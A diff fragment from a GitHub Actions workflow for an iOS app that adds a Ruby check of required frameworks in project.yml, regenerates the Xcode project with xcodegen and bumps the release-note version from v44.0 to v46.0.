+          if command -v ruby >/dev/null 2>&1; then
+            ruby -ryaml -e 'd=YAML.load_file("project.yml"); sdk=d["targets"]["natsuk1"]["dependencies"].map{|e| e["sdk"]}; need=%w[Foundation.framework UIKit.framework WebKit.framework AVFoundation.framework CoreLocation.framework Network.framework]; miss=need-sdk; abort("missing dependencies: "+miss.join(",")) unless miss.empty?; puts "project.yml ok: "+sdk.size.to_s+" frameworks"'
+          else
+            echo "ruby unavailable, skipping pre-parse"
+          fi
+
+      - name: Generate project
+        run: |
+          set -euo pipefail
           rm -rf natsuk1.xcodeproj
           xcodegen generate
 
@@ -531,7 +2707,7 @@ jobs:
           gh release view development >/dev/null 2>&1 && gh release delete development --yes --cleanup-tag || true
           R="${{ github.repository }}"
           IPA="https://github.com/$R/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v44.0 ($((SIZE/1024)) KB)
+          NOTES="natsuk1 v46.0 ($((SIZE/1024)) KB)
 
           **Install**
 
